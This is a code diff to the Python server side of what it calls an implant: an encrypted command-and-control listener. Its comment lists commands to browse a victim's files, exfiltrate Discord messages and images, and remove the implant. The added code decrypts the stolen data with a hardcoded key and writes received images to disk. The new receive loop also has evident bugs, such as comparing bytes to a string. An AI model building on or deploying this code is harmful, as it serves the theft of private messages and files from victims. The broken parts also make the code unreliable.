@@ -4,7 +4,7 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 import os
 
-SERVER_IP = '192.168.56.1'
+SERVER_IP = '172.31.4.131'
 SERVER_PORT = 8080
 
 def encrypt_tdes(key, data):
@@ -50,6 +50,15 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((SERVER_IP, SERVER_PORT))
 key = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'
 
+i = 0
+
+'''
+Commands:
+1. ls, cat: to browse filesystem
+2. exfil: to exfil discord messages
+3. exfil image path/to/image.jpg: to exfil images 
+4. remove: to remove implant from filesystem
+'''
 while True:
     server_socket.listen()
 
@@ -68,13 +77,48 @@ while True:
 
         conn.sendall(encrypt_tdes(key, message.encode()))
 
-        response = conn.recv(4096)
+        data = []
+        while True:
+            client_side = conn.recv(4096)
 
-        if message.split(' ')[0] == "exfil":
-            print(decrypt_aes(key, response).decode()) # data exfil obfuscation is AES
-        else:
-            print(decrypt_tdes(key, response).decode()) # C2 comms obfuscation is TripleDES
+            if client_side == "Done":
+                print("Breaking")
+                break
+            
+            print("Received new data")
+            data += client_side
 
-        if not response:
+        if len(data) == 0:
             print("Connection to {} closed".format(addr[0]))
             break
+
+        if message.split(' ')[0] == "exfil":
+            if len(message.split(' ')) > 1 and message.split(' ')[1] == "image":
+                response = decrypt_aes(key, data)
+                # while True:
+                #     r = decrypt_aes(key, conn.recv(4096))
+                #     if not r:
+                #         break
+                #     response += r
+                # print("Image data received successfully!")
+
+                with open(f"images/received_image_{i}.jpg", "wb") as f:
+                    f.write(response)
+
+                print("Image file written successfully!")
+            else:
+                response = decrypt_aes(key, data)
+                # while True:
+                #     r = decrypt_aes(key, conn.recv(4096))
+                #     if not r:
+                #         break
+                #     response += r
+        else:  
+            response = decrypt_tdes(key, data)
+            # while True:
+                
+            #     if not r:
+            #         break
+            #     response += r
+
+        print(response.decode())
